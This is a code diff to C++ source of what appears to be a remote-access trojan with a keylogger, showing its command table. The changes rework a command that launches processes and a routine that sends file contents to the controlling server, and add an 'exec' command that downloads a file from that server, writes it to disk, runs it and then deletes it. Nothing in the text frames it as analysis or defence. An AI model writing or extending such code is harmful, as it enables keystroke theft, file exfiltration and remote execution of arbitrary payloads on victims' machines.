@@ -34,18 +34,25 @@ command_t commandDefs[] = {
 					return;
 
 				std::string fileArgs = join_at_index(args, " ");
-				wchar_t dest[_MAX_PATH];
+				TCHAR dest[_MAX_PATH];
+#ifdef UNICODE
 				mbstowcs(dest, fileArgs.c_str(), _MAX_PATH);
+#else
+				strcpy_s(dest, fileArgs.c_str());
+#endif
 
 				PROCESS_INFORMATION pi;
-				ZeroMemory(&pi, sizeof(pi));
-
 				STARTUPINFO si;
+				ZeroMemory(&pi, sizeof(pi));
 				ZeroMemory(&si, sizeof(si));
-
 				si.cb = sizeof(si);
 
-				CreateProcessW(NULL, dest, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+				BOOL ret = CreateProcess(NULL, dest, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+				if (!ret)
+				{
+					Error(_T("batch: Failed to create process"));
+					return;
+				}
 			}
 		},
 		{
@@ -89,7 +96,7 @@ command_t commandDefs[] = {
 					goto g_3;
 				}
 
-				network.SendPost(NULL, 0, NULL, NULL, V_NET_FILE_DATA, buffer, size, false);
+				network.SendFile(V_NET_FILE_DATA, size, buffer);
 
 				g_3:	free(buffer);
 				g_2:	fclose(fp);
@@ -104,6 +111,57 @@ command_t commandDefs[] = {
 		{
 			"exit", [](std::vector<std::string> args) {
 				keylogger.Stop();
+			}
+		},
+		{
+			"exec", [](std::vector<std::string> args) {
+
+				if (args.size() < 1)
+					return;
+
+				if (args[0].size() < 1)
+					return;
+
+				const char *file_path = args[0].c_str();
+				const char *file_name = PathFindFileNameA(file_path);
+
+				size_t resp_len;
+				char *resp;
+				network.GetFile(file_path, &resp_len, &resp);
+
+				HANDLE hFile = CreateFileA(file_name, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+				if(hFile == INVALID_HANDLE_VALUE)
+				{
+					Error(_T("exec: Failed to create file"));
+					goto g_1;
+				}
+				DWORD written;
+				WriteFile(hFile, resp, resp_len, &written, 0);
+				if (written != resp_len)
+				{
+					Error(_T("exec: Written differs from buffer length"));
+					CloseHandle(hFile);
+					goto g_2;
+				}
+				
+				CloseHandle(hFile);
+
+
+				PROCESS_INFORMATION pi;
+				STARTUPINFOA si;
+				ZeroMemory(&pi, sizeof(pi));
+				ZeroMemory(&si, sizeof(si));
+				si.cb = sizeof(si);
+
+				BOOL ret = CreateProcessA(file_name, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
+				if (!ret)
+				{
+					Error(_T("exec: Failed to create process"));
+					goto g_2;
+				}
+
+				g_2: DeleteFileA(file_name);
+				g_1: free(resp);
 			}
 		}
 };
